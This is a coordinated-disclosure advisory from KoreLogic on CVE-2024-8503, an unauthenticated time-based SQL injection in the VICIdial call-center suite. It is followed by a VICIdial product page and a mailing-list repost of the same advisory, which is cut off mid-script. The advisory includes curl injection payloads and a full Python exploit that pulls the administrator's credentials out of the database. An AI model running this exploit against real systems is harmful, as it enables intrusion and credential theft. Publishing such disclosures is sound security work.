=== Content from korelogic.com_0d75ddfd_20250110_225438.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2024-011: VICIdial Unauthenticated SQL Injection
Title: VICIdial Unauthenticated SQL Injection
Advisory ID: KL-001-2024-011
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt
1. Vulnerability Details
Affected Vendor: VICIdial
Affected Product: VICIdial
Affected Version: 2.14-917a
Platform: GNU/Linux
CWE Classification: CWE-89: Improper Neutralization of Special
Elements used in an SQL Command
('SQL Injection')
CVE ID: CVE-2024-8503
2. Vulnerability Description
An unauthenticated attacker can leverage a time-based SQL
injection vulnerability in VICIdial to enumerate database
records. By default, VICIdial stores plaintext credentials
within the database.
3. Technical Description
VICIdial is an open-source contact center suite, mainly used
by call centers. The "vicidial.com" website boasts over 14,000
registered installations. There is a public SVN repository to
access the source code, as well as an ISO that can be used to
install the software. The ISO was used in a virtual machine
for testing purposes.
When performing SQL queries, VICIdial does not use prepared
statements, but instead uses the "preg\_replace" PHP function
to remove problematic characters in user-controlled input
before interpolating the variable into a SQL query. This
is largely an effective solution, as regular expressions
like "/[^-\_0-9a-zA-Z]/" are passed to "preg\_replace", which
essentially limits input to the characters shown in the pattern
(letters, numbers, underscores, and hyphens).
However, these scripts do not utilize a shared PHP file
for performing sanitization uniformly. Instead, each script
individually implements the "preg\_replace" function, leading
to inconsistencies in which patterns are used and where they
are applied.
For example, providing credentials via the "Authorization"
request header using the "Basic" scheme, most PHP scripts
sanitize the username value with the following line:
$PHP\_AUTH\_USER = preg\_replace('/[^-\_0-9a-zA-Z]/','',$PHP\_AUTH\_USER);
However, the "VERM\_AJAX\_functions.php" PHP script does not
perform any sanitization before inserting the username into
a SQL "INSERT" statement:
$PHP\_AUTH\_USER=$\_SERVER['PHP\_AUTH\_USER'];
$PHP\_AUTH\_PW=$\_SERVER['PHP\_AUTH\_PW'];
...
if ($function=="log\_custom\_report")
{
$rpt\_log\_stmt="insert ignore into
verm\_custom\_report\_holder(user,
report\_name, report\_parameters)
values('$PHP\_AUTH\_USER', '$custom\_report\_name',
'$LOGhttp\_referer') ON DUPLICATE KEY
UPDATE report\_name='$custom\_report\_name',
report\_parameters='$custom\_report\_vars'";
$rpt\_log\_rslt=mysql\_to\_mysqli($rpt\_log\_stmt, $link);
return mysqli\_affected\_rows($rpt\_log\_rslt);
}
Since "VERM\_AJAX\_functions.php" can be accessed without
authentication, this creates a straight forward unauthenticated
SQL injection vulnerability. While the page response cannot
be manipulated by the execution of the query, delays in the
page response can be observed when using SQL functions such as
"sleep()", enabling the enumeration of database values using
time-based SQL injection:
$ time curl -u "foo:bar" \
http://REDACTED/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m0.019s <--- (normal response time)
user 0m0.004s
sys 0m0.008s
$ time curl -u "','',sleep(5));#:bar" \
http://REDACTED/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m5.023s <--- (5-second delay in response time)
user 0m0.003s
sys 0m0.008s
This observable difference can be used to craft queries that
sleep under specific conditions, allowing an attacker to ask
"Yes or No" questions. In the following example, the "sleep()"
function is called only if the provided string matches the
database version:
$ time curl -u \
"','',IF(@@version='korelogic',sleep(5),NULL));#:bar" \
http://vicidial.zz/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m0.024s <--- (normal response time)
user 0m0.006s
sys 0m0.003s
$ time curl -u \
"','',IF(@@version='10.6.14-MariaDB-log',sleep(5),NULL));#:bar" \
http://vicidial.zz/VERM/VERM\_AJAX\_functions.php?function=log\_custom\_report
real 0m5.019s <--- (5-second delay in response time)
user 0m0.004s
sys 0m0.008s
4. Mitigation and Remediation Recommendation
This issue has been remediated in the public svn/trunk codebase,
as of revision 3848 committed 2024-07-08.
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic,
Inc.
6. Disclosure Timeline
2024-07-05 : KoreLogic requests security contact from
support@vicidial.com.
2024-07-08 : KoreLogic reports vulnerability details to VICIdial
contact.
2024-07-08 : VICIdial notifies KoreLogic that the issue has been
remediated with revision 3848 in the public
Subversion repository.
2024-07-11 : KoreLogic confirms this vulnerability has been
remediated. KoreLogic asks VICIdial if it is
appropriate to publicly disclose the vulnerability
details at this time.
2024-07-11 : VICIdial requests four weeks of embargo in order to
upgrade supported customers.
2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
publicly disclose the vulnerability details at
this time.
2024-08-09 : VICIdial requests an additional two weeks of
embargo.
2024-09-10 : KoreLogic public disclosure.
7. Proof of Concept
The following script can be used to automate the exploitation process and
enumerate the results of provided queries:
$ time python unauth\_sqli.py -rh vicidial.zz -rp 443 -q 'SELECT @@version'
[+] Target appears vulnerable to time-based SQL injection
[~] Executing SQL: SELECT @@version
[~] 1
[~] 10
[~] 10.
[~] 10.6
[~] 10.6.
[~] 10.6.1
[~] 10.6.14
[~] 10.6.14-
[~] 10.6.14-M
[~] 10.6.14-Ma
[~] 10.6.14-Mar
[~] 10.6.14-Mari
[~] 10.6.14-Maria
[~] 10.6.14-MariaD
[~] 10.6.14-MariaDB
[~] 10.6.14-MariaDB-
[~] 10.6.14-MariaDB-l
[~] 10.6.14-MariaDB-lo
[~] 10.6.14-MariaDB-log
real 0m6.727s
user 0m0.425s
sys 0m0.020s
##############################
## unauth\_sqli.py ##
##############################
import string
import random
import urllib3
import argparse
import requests
from base64 import b64encode
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
class Exploit:
def \_\_init\_\_(self, rhost, rport, proxy=None):
"""
This 'sleep' duration is derived by the average response time
multiplied by this value. A server with an average response time
of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
"""
self.SLEEP\_MULTIPLIER = 30
self.REQUEST\_HEADERS = {'User-Agent': 'KoreLogic'}
self.ALLOWED\_SCHEMES = ['http', 'https']
if proxy:
self.REQUEST\_PROXIES = {
'http': proxy,
'https': proxy
}
else:
self.REQUEST\_PROXIES = {}
self.TARGET\_IP = rhost
self.TARGET\_PORT = rport
self.VICIDIAL\_FINGERPRINT = 'Please Hold while I redirect you!'
self.RANDOM\_CHARSET = string.ascii\_uppercase + string.digits
# returns a URI with 'http' or 'https'
def determine\_target\_uri(self):
for scheme in self.ALLOWED\_SCHEMES:
target\_uri = f'{scheme}://{self.TARGET\_IP}:{self.TARGET\_PORT}'
try:
response = requests.get(target\_uri, headers=self.REQUEST\_HEADERS, verify=False)
if self.VICIDIAL\_FINGERPRINT in response.text:
return target\_uri
except:
pass
# returns a session object with custom proxies/headers if supplied
def build\_requests\_session(self):
self.base\_uri = self.determine\_target\_uri()
session = requests.Session()
session.proxies = self.REQUEST\_PROXIES
session.verify = False
return session
# returns a random string of a given length
def random(self, length):
return ''.join(random.choice(self.RANDOM\_CHARSET) for \_ in range(length))
# returns a timedelta representing the response time of an injected SQL query
def time\_sql\_query(self, query, session):
username = f"goolicker', '', ({query}));# "
credentials = f'{username}:password'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/VERM/VERM\_AJAX\_functions.php'
request\_params = {'function': 'log\_custom\_report', self.random(5): self.random(5)}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
return response.elapsed
# returns a boolean if time-based SQL injection is possible, additionally
# sets the best 'sleep' duration based on response times
def is\_vulnerable(self, session, baseline\_iterations=5):
# determine average baseline response time
zero\_sleep\_query = f'SELECT (NULL)'
total\_baseline\_time = 0
for \_ in range(baseline\_iterations):
execution\_time = self.time\_sql\_query(zero\_sleep\_query, session)
total\_baseline\_time += execution\_time.total\_seconds()
average\_baseline\_response\_time = total\_baseline\_time / baseline\_iterations
self.sql\_baseline\_time = average\_baseline\_response\_time
# determine if injected sleep query impacts response time
sleep\_length = round(average\_baseline\_response\_time \* self.SLEEP\_MULTIPLIER, 2)
sleep\_query = f'SELECT (sleep({sleep\_length}))'
execution\_time = self.time\_sql\_query(sleep\_query, session)
if execution\_time.total\_seconds() >= sleep\_length:
self.sql\_sleep\_length = sleep\_length
return True
else:
return False
# determine if a character at a specific indice of a query result returns a
# boolean 'true' when compared to a given character using the supplied operator
def check\_indice\_of\_query\_result(self, session, query, indice, operator, ordinal):
parent\_query = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, sleep({self.sql\_sleep\_length}), null)'
execution\_time = self.time\_sql\_query(parent\_query, session)
return execution\_time.total\_seconds() >= (self.sql\_baseline\_time \* self.SLEEP\_MULTIPLIER)
def enumerate\_sql\_query(self, session, query='SELECT @@version', charset=string.printable):
# convert charset to ordinals
all\_characters = sorted([ord(char) for char in charset])
reduced\_characters = all\_characters
# use a binary search and enumerate query results
result = ''
indice = 1
indice\_could\_be\_null = True
while True:
"""
we check if the value is NULL once per indice
to determine when a string ends. this adds one
request per indice, but since every boolean 'true'
results in a delay this is faster than counting
the length of the string before enumrating.
"""
if indice\_could\_be\_null:
if self.check\_indice\_of\_query\_result(session, query, indice, '=', '0'):
break
else:
indice\_could\_be\_null = False
# enumerate each character of query result with a binary search
middle\_indice = len(reduced\_characters) // 2
middle\_ordinal = reduced\_characters[middle\_indice]
if self.check\_indice\_of\_query\_result(session, query, indice, '<=', middle\_ordinal):
if self.check\_indice\_of\_query\_result(session, query, indice, '=', middle\_ordinal):
reduced\_characters = all\_characters
result += chr(middle\_ordinal)
indice += 1
indice\_could\_be\_null = True
print(f'[~] {result}')
else:
reduced\_characters = reduced\_characters[:middle\_indice]
else:
reduced\_characters = reduced\_characters[middle\_indice:]
return result
# returns administrator username and password by
# exploiting time-based SQL injection.
def extract\_admin\_credentials(self, session):
print('[~] Enumerating administrator credentials')
username\_charset = string.ascii\_letters + string.digits
admin\_username\_query = "SELECT user FROM vicidial\_users WHERE user\_level = 9 AND modify\_same\_user\_level = '1' LIMIT 1"
admin\_username = self.enumerate\_sql\_query(session, admin\_username\_query, username\_charset)
print(f'[+] Username: {admin\_username}')
password\_charset = string.ascii\_letters + string.digits + '-.+/=\_'
admin\_password\_query = f"SELECT pass FROM vicidial\_users WHERE user = '{admin\_username}' LIMIT 1"
admin\_password = self.enumerate\_sql\_query(session, admin\_password\_query, password\_charset)
print(f'[+] Password: {admin\_password}')
return admin\_username, admin\_password
# injects SQL queries and enumerates results if instance is vulnerable
def exploit(self, custom\_query=None):
session = self.build\_requests\_session()
is\_vulnerable = self.is\_vulnerable(session)
if is\_vulnerable:
print('[+] Target appears vulnerable to time-based SQL injection')
else:
print('[-] Failed to perform time-based SQL injection')
return
if custom\_query:
print(f'[~] Executing SQL: {custom\_query}')
self.enumerate\_sql\_query(session, custom\_query)
else:
self.extract\_admin\_credentials(session)
if \_\_name\_\_ == '\_\_main\_\_':
argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi')
required = argparser.add\_argument\_group('Required Arguments')
optional = argparser.add\_argument\_group('Optional Arguments')
required.add\_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
required.add\_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
optional.add\_argument('-q', '--query', required=False, help='Custom SQL query to execute', default=None)
optional.add\_argument('-p', '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', default=None)
arguments = argparser.parse\_args()
exploit = Exploit(
rhost = arguments.rhost,
rport = arguments.rport,
proxy = arguments.proxy
)
exploit.exploit(custom\_query=arguments.query)
The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/
KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html
Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
-----BEGIN PGP SIGNATURE-----
iQJOBAEBCAA4FiEEB12WYZwbVwYTJ/b2DKLsCTlWkekFAmbgm1gaHGRpc2Nsb3N1
cmVzQGtvcmVsb2dpYy5jb20ACgkQDKLsCTlWkenMFQ/+JMm3fGfXFFfDd3oamH8W
FG1VNc2T8+Ea0OCu+iFALgmu90ghhxVM/cqaMtOm25NMqvT1pi9VQaIaA5+Ft+c+
7dnhYmRqpJWSPVU5Xxvq5Pt8wrNAp6u1I1c/i6y30OgB2Y3rFaJgxjbbTh8JYgWB
uWVtuUrHaWOAU+KHiy9ZbZ4WsnCGUyi71FdO6QC2Acw3qr4Hz+sg0GxIoNi9jqHo
tUWQfAbOKiSPUt0CyipIRQrJFBUL0wF3bATprCuORf/3j07dL9LaBl7gy0mQau4k
9SR/RsCxB0wHMdZALhK3RjJqk1gI0wNgVmlRjuumD5d6S4Gk0lXpCgzj4vdciHAH
V9qGue67sHSspVxQQV08zHrTlh95RF+0HnSlKlSHDfcP7t3BelYVHdHsRkioGQ6N
UBJZuGtwP6/89TLTCULncl4+H0mRXSmMLWM55O2/pSUNHUO85bI7OmXWflJdjItZ
2gCc++u0zYlubFuEhB5qfP6tnEAfOOfVGY0wlnN5nAHlKzqrcdcmK1Uuzk6Ztu5T
SWPMAsroU+GtuZhAcYGpVZTw/lNA3SBRCrJ8RHfWJNjIaZA9OMR2L2iLiDF8KuI3
QN6m2YV/ZCSTGXPmEjt9Lho/mtWUb6SR6guLHR0viATscYU/pe+WX+kCUaAKavVp
gVpFTMBa64wxLnJev31Japs=
=zl7U
-----END PGP SIGNATURE-----


=== Content from www.vicidial.org_d785da79_20250110_225439.html ===


| [vicidial.org](./) | | **VICIDIAL** |
| --- | --- | --- |
| codebar |
|  |  | **VICIDIAL Contact Center Suite -**  [click for an enlarged screenshot](./images/VICIDIAL_agent_2.0.5.gif)   **The VICIDIAL project is maintained by the [VICIDIAL Group](http://www.vicidial.com).**  **More VICIDIAL-related links:**  * [the project website](http://astguiclient.sf.net/)* [the commercial website](http://www.vicidial.com)* [the hosted service website](http://www.vicihost.com)* [the VICIdial Whitepaper](https://www.vicidial.com/?page_id=656)* [demo administration site](demo.php)* [Download the LiveCD ISO of ViciDial to try for yourself](http://www.vicibox.com/)* [VICIDIAL Forums](http://www.vicidial.org/VICIDIALforum/index.php)* [VICIDIAL Wiki](http://wiki.vicidial.org)* [VICIDIAL Issue Tracker](http://www.vicidial.org/VICIDIALmantis)* [download the VICIDIAL Brochure](http://www.vicidial.org/vicidial_brochure_sheet.pdf) (PDF)* [A case-study presentation](http://www.vicidial.org/presentations/Astricon2005_matt_florell_PDF.pdf) about a large VICIDIAL installation* [Sample VICIDIAL reports](http://www.vicidial.org/VICIDIALreports/)* [VICIDIAL Agent Manual](http://www.vicidial.org/store.php)* [VICIDIAL Manager Manual](http://www.vicidial.org/store.php#MANAGER)* [Click here download (svn revision 3344 [2021-01-22])](https://sourceforge.net/projects/astguiclient/files/astguiclient_svn-trunk-rev-3344.zip/download)* [Click here to download the latest VICIdial svn/trunk nightly snapshots](https://www.vicidial.org/svn_trunk_nightly/)* [Development Twitter feed](https://twitter.com/vicidial_dev)   VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound contact center suite with inbound email support as well.  The agent interface is an interactive set of web pages that work through a web browser to give real-time information and functionality with nothing more than an internet browser on the client computer.  The management interface is also web-based and offers the ability to view many real-time and summary reports as well as many detailed campaign and agent options and settings.  VICIDIAL can function as an ACD for inbound calls or for Closer calls coming from VICIDIAL outbound fronters and even allows for remote agents logging in from remote locations as well as remote agents that may only have a phone.  There are currently over 24,000 installations of VICIDIAL in production in over 100 countries around the world, several with over 300 agent seats and many with multiple locations.  The software suite also includes a from-scratch software installation document, full English and Spanish versions of the web-clients and admin pages(and functional versions of several other languages), and is designed to work with an Asterisk system that has Zap/DAHDI(T1/E1/PSTN) telco lines or VOIP(IAX or SIP) trunks and many different kinds of softphones and hardphones. This group of applications is designed to run on top of almost any version of Asterisk so no messing around with the Asterisk source code is necessary. For more information see the system requirements at the bottom of the page.  **MAJOR VICIDIAL FEATURES:**  * Inbound, Outbound and Blended call handling and Inbound Email handling* Outbound agent-controlled, broadcast and predictive dialing* Full USA, Canada and UK reegulatory compliance capability* Web-based agent and administrative interfaces* Ability to have agents operate remotely* Integrated call recording* Three-Way calling within the agent application* Scheduled Callbacks: Agent-Only and Anyone* Web-configurable IVRs and Voicemail boxes* Scalable to hundreds of seats* Ability to use standard Telco lines and VOIP trunks* Open-Source AGPLv2 licensed, with no software licensing cost   **Full Features List:**  * Ability for an agent to call clients in succession from a database through a web-client* Ability to display a script for the agent to read with fields like name, address, etc. filled-in* Ability to set a campaign to auto-dial and send live calls to available agents* Ability to dial predictively in a campaign with an adaptive dialing algorithm* Ability to dial on a single campaign across multiple Asterisk servers, or multiple campaigns on a single server* Ability to transfer calls with customer data to a closer/verifier on the local system or a remote Asterisk server* Ability to open a custom web page with user data from the call, per campaign* Ability to autodial campaigns to start with a simple IVR then direct to agent* Ability to broadcast dial to customers with a pre-recorded message* Ability to park the customer with custom music per campaign* Ability to send a dropped call to a voicemail box, queue or extension per campaign if no agent is available* Ability to set outbound CallerID per campaign or per list* Ability to take inbound calls gathering CallerID* Ability to function as an ACD for inbound and fronter/closer verification calls* Ability to have an agent take both inbound and outbound calls in one session(blended)* Ability to start and stop recording an agent's calls at any time* Ability to automatically record all calls* Ability to manually or automatically call upto two other customer numbers for the same lead* Automatically dial unlimited alternate numbers per customer until you get an answer* Ability to schedule a callback with a customer as either any-agent or agent-specific* Ability in Manual dial mode to preview leads before dialing* Ability for agents to be logged in remotely anywhere with just a phone and a web browser* Faster hangup and dispositioning of calls with one key press (HotKeys)* Definable Agent Wrapup-time per campaign* Ability to add custom call dispositions per campaign* Ability to use custom database queries in campaign dialing* Recycling of specified status calls at a specified interval without resetting a list* Dialing with custom TimeZone restrictions including per state and per day-of-the-week* Dialing with Answering Machine Detection, also playing a message for AM calls* Multiple campaigns and lead-lists are possible* Option of a drop timer with safe-harbor message for FTC compliance* Variable drop call percentage when dialing predictively for FTC compliance* System-wide and per-campaign DNC lists that can optionally be activated per campaign* All calls are logged and statuses of calls are logged as well as agent time breakdowns* Load Balancing of call across multiple inbound or outbound Asterisk servers is possible* Agent phone login balancing and failover across multiple ViciDial servers* Several real-time and summary reports available* Real-time campaign display screens* 3rd party conferencing(with DTMF macros and number presets)* 3rd party blind call transfer* 3rd party conferencing with agent drop-off* Custom Music-On-Hold and agent alert sound for inbound calls* Estimated hold time, place in line, overflow queues and several other inbound-only features* Skills-based ranking and call routing per inbound group(queues) and campaign* Queue Prioritization per campaign and inbound group* Single agent call queueing* Ability to set user levels and permissions for certain features and campaigns* Ability for managers to listen-in on agent conversations* Ability for managers to enter conversations with agents and customers* Ability for managers to change the selected queues for an agent* Ability for agents to select a Pause Code when they are not active* Ability for agents to control volume levels and mute themselves* Ability for agents to view the statuses of other agents on the system* Ability for agents to view details for calls in queue that the agent is selected to take calls from* Ability for agents to select and click to take calls in queue from their agent screen* Agent shift enforcement by day and time, defined per user group* Full QueueMetrics-compatible call logging, inbound and outbound* Several Vtiger integration features: user-sync, account-sync, data interconnection* Full integration with Sangoma Call Progress Detection(CDP) for better Answering Machine Detection(AMD)* Multi-function web-based agent API allowing for control of agent sessions including click-to-dial outside of the agent screen* Lead import web-based API* Web-based data export utilities* Separate Time-clock application to track user work time* Web-based administration* DID, phone and carrier trunk provisioning through the web interface* Client web-app web pages available in English, Spanish, Greek, German, French, Italian, Polish, Portuguese, Brazilian Portuguese, Slovak, Russian, Dutch, Swedish, Traditional Chinese, Danish and Japanese.* Admin web pages available in English, Spanish, Greek, German, Italian, French and Brazilian Portuguese.  ***- Requires:** The server elements require an Asterisk server(we support Asterisk versions 1.2, 1.4, 1.8, 11 and 13 [13 is preferred]), Zap(DAHDI),IAX or SIP trunks and SIP/IAX/Zap phones, MySQL 5.0 or greater database server (local or remote)[MariaDB is preferred], Apache and PHP 5.0 or greater (local or remote), Perl with a few dozen CPAN modules installed. We recommend using Google Chrome or Firefox for the web-clients, but they will also run on InternetExplorer 6+, Mozilla 1.7+, Netscape 8+ and Opera 8.5+.* ***- License:** AGPLv2* |
| | [**ASTERISK SYSTEMS**](hardware.php) | | --- | |  | | **VICIDIAL Links** | | [**- VICIDIAL Information**](vicidial.php) | | [**- VICIDIAL Manuals**](store.php) | | [**- VICIDIAL Forum**](http://www.vicidial.org/VICIDIALforum) | | [**- VICIDIAL Wiki**](http://wiki.vicidial.org) | | [**- VICIDIAL Tracker**](http://www.vicidial.org/VICIDIALmantis) | | [**- VICIDIAL Training**](training.php) | | [**- VICIDIAL Demo**](demo.php) | |  | | [**DOWNLOADS**](downloads.php) | |  | | [**COMPANY INFO**](company_info.php) | |  | | [**CONTACT US**](contact_us.php) | |  | | [**CONSULTING**](consulting.php) | |  | | [**PRESENTATIONS**](presentations.php) | |  | | Copyright ©2024 Vicidial Group | |  | | |

![](./images/blank.gif)



=== Content from seclists.org_62af0926_20250110_225438.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-011: VICIdial Unauthenticated SQL Injection

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Tue, 10 Sep 2024 14:28:59 -0500

---

```

KL-001-2024-011: VICIdial Unauthenticated SQL Injection

Title: VICIdial Unauthenticated SQL Injection
Advisory ID: KL-001-2024-011
Publication Date: 2024-09-10
Publication URL: <https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt>

1. Vulnerability Details

     Affected Vendor: VICIdial
     Affected Product: VICIdial
     Affected Version: 2.14-917a
     Platform: GNU/Linux
     CWE Classification: CWE-89: Improper Neutralization of Special
                         Elements used in an SQL Command
                         ('SQL Injection')
     CVE ID: CVE-2024-8503

2. Vulnerability Description

     An unauthenticated attacker can leverage a time-based SQL
     injection vulnerability in VICIdial to enumerate database
     records. By default, VICIdial stores plaintext credentials
     within the database.

3. Technical Description

     VICIdial is an open-source contact center suite, mainly used
     by call centers. The "vicidial.com" website boasts over 14,000
     registered installations. There is a public SVN repository to
     access the source code, as well as an ISO that can be used to
     install the software. The ISO was used in a virtual machine
     for testing purposes.

     When performing SQL queries, VICIdial does not use prepared
     statements, but instead uses the "preg_replace" PHP function
     to remove problematic characters in user-controlled input
     before interpolating the variable into a SQL query. This
     is largely an effective solution, as regular expressions
     like "/[^-_0-9a-zA-Z]/" are passed to "preg_replace", which
     essentially limits input to the characters shown in the pattern
     (letters, numbers, underscores, and hyphens).

     However, these scripts do not utilize a shared PHP file
     for performing sanitization uniformly. Instead, each script
     individually implements the "preg_replace" function, leading
     to inconsistencies in which patterns are used and where they
     are applied.

     For example, providing credentials via the "Authorization"
     request header using the "Basic" scheme, most PHP scripts
     sanitize the username value with the following line:

    $PHP_AUTH_USER = preg_replace('/[^-_0-9a-zA-Z]/','',$PHP_AUTH_USER);

     However, the "VERM_AJAX_functions.php" PHP script does not
     perform any sanitization before inserting the username into
     a SQL "INSERT" statement:

    $PHP_AUTH_USER=$_SERVER['PHP_AUTH_USER'];
    $PHP_AUTH_PW=$_SERVER['PHP_AUTH_PW'];
    ...
    if ($function=="log_custom_report")
      {
      $rpt_log_stmt="insert ignore into
        verm_custom_report_holder(user,
        report_name, report_parameters)
        values('$PHP_AUTH_USER', '$custom_report_name',
        '$LOGhttp_referer') ON DUPLICATE KEY
        UPDATE report_name='$custom_report_name',
        report_parameters='$custom_report_vars'";
      $rpt_log_rslt=mysql_to_mysqli($rpt_log_stmt, $link);
      return mysqli_affected_rows($rpt_log_rslt);
      }

     Since "VERM_AJAX_functions.php" can be accessed without
     authentication, this creates a straight forward unauthenticated
     SQL injection vulnerability. While the page response cannot
     be manipulated by the execution of the query, delays in the
     page response can be observed when using SQL functions such as
     "sleep()", enabling the enumeration of database values using
     time-based SQL injection:

    $ time curl -u "foo:bar" \
 <http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report>

    real    0m0.019s   <--- (normal response time)
    user    0m0.004s
    sys    0m0.008s

    $ time curl -u "','',sleep(5));#:bar" \
 <http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report>

    real    0m5.023s   <--- (5-second delay in response time)
    user    0m0.003s
    sys    0m0.008s

     This observable difference can be used to craft queries that
     sleep under specific conditions, allowing an attacker to ask
     "Yes or No" questions. In the following example, the "sleep()"
     function is called only if the provided string matches the
     database version:

    $ time curl -u \
        "','',IF(@@version='korelogic',sleep(5),NULL));#:bar" \
 <http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report>

    real    0m0.024s   <--- (normal response time)
    user    0m0.006s
    sys    0m0.003s

    $ time curl -u \
 "','',IF(@@version='10.6.14-MariaDB-log',sleep(5),NULL));#:bar" \
 <http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report>

    real    0m5.019s   <--- (5-second delay in response time)
    user    0m0.004s
    sys    0m0.008s

4. Mitigation and Remediation Recommendation

     This issue has been remediated in the public svn/trunk codebase,
     as of revision 3848 committed 2024-07-08.

5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic,
     Inc.

6. Disclosure Timeline

     2024-07-05 : KoreLogic requests security contact from
                  support () vicidial com.
     2024-07-08 : KoreLogic reports vulnerability details to VICIdial
                  contact.
     2024-07-08 : VICIdial notifies KoreLogic that the issue has been
                  remediated with revision 3848 in the public
                  Subversion repository.
     2024-07-11 : KoreLogic confirms this vulnerability has been
                  remediated. KoreLogic asks VICIdial if it is
                  appropriate to publicly disclose the vulnerability
                  details at this time.
     2024-07-11 : VICIdial requests four weeks of embargo in order to
                  upgrade supported customers.
     2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
                  publicly disclose the vulnerability details at
                  this time.
     2024-08-09 : VICIdial requests an additional two weeks of
                  embargo.
     2024-09-10 : KoreLogic public disclosure.

7. Proof of Concept

     The following script can be used to automate the exploitation process and
     enumerate the results of provided queries:

         $ time python unauth_sqli.py -rh vicidial.zz -rp 443 -q 'SELECT @@version'
         [+] Target appears vulnerable to time-based SQL injection
         [~] Executing SQL: SELECT @@version
         [~] 1
         [~] 10
         [~] 10.
         [~] 10.6
         [~] 10.6.
         [~] 10.6.1
         [~] 10.6.14
         [~] 10.6.14-
         [~] 10.6.14-M
         [~] 10.6.14-Ma
         [~] 10.6.14-Mar
         [~] 10.6.14-Mari
         [~] 10.6.14-Maria
         [~] 10.6.14-MariaD
         [~] 10.6.14-MariaDB
         [~] 10.6.14-MariaDB-
         [~] 10.6.14-MariaDB-l
         [~] 10.6.14-MariaDB-lo
         [~] 10.6.14-MariaDB-log

         real    0m6.727s
         user    0m0.425s
         sys    0m0.020s

     ##############################
     ##      unauth_sqli.py      ##
     ##############################

     import string
     import random
     import urllib3
     import argparse
     import requests
     from base64 import b64encode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

     class Exploit:
         def __init__(self, rhost, rport, proxy=None):
             """
             This 'sleep' duration is derived by the average response time
             multiplied by this value. A server with an average response time
             of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
             """
             self.SLEEP_MULTIPLIER = 30
             self.REQUEST_HEADERS = {'User-Agent': 'KoreLogic'}
             self.ALLOWED_SCHEMES = ['http', 'https']
             if proxy:
                 self.REQUEST_PROXIES = {
                     'http':  proxy,
                     'https': proxy
                 }
             else:
                 self.REQUEST_PROXIES = {}

             self.TARGET_IP   = rhost
             self.TARGET_PORT = rport

             self.VICIDIAL_FINGERPRINT = 'Please Hold while I redirect you!'
             self.RANDOM_CHARSET = string.ascii_uppercase + string.digits

         # returns a URI with 'http' or 'https'
         def determine_target_uri(self):
             for scheme in self.ALLOWED_SCHEMES:
                 target_uri = f'{scheme}://{self.TARGET_IP}:{self.TARGET_PORT}'
                 try:
                     response = requests.get(target_uri, headers=self.REQUEST_HEADERS, verify=False)
                     if self.VICIDIAL_FINGERPRINT in response.text:
                         return target_uri
                 except:
                     pass

         # returns a session object with custom proxies/headers if supplied
         def build_requests_session(self):
             self.base_uri = self.determine_target_uri()
             session = requests.Session()
             session.proxies = self.REQUEST_PROXIES
             session.verify  = False
             return session

         # returns a random string of a given length
         def random(self, length):
             return ''.join(random.choice(self.RANDOM_CHARSET) for _ in range(length))

         # returns a timedelta representing the response time of an injected SQL query
         def time_sql_query(self, query, session):
             username    = f"goolicker', '', ({query}));# "
             credentials = f'{username}:password'
             credentials_base64 = b64encode(credentials.encode()).decode()
             auth_header = f'Basic {credentials_base64}'

             target_uri = f'{self.base_uri}/VERM/VERM_AJAX_functions.php'
             request_params  = {'function': 'log_custom_report', self.random(5): self.random(5)}
             request_headers = {**self.REQUEST_HEADERS, 'Authorization': auth_header}

             response = session.get(target_uri, params=request_params, headers=request_headers)
             return response.elapsed

         # returns a boolean if time-based SQL injection is possible, additionally
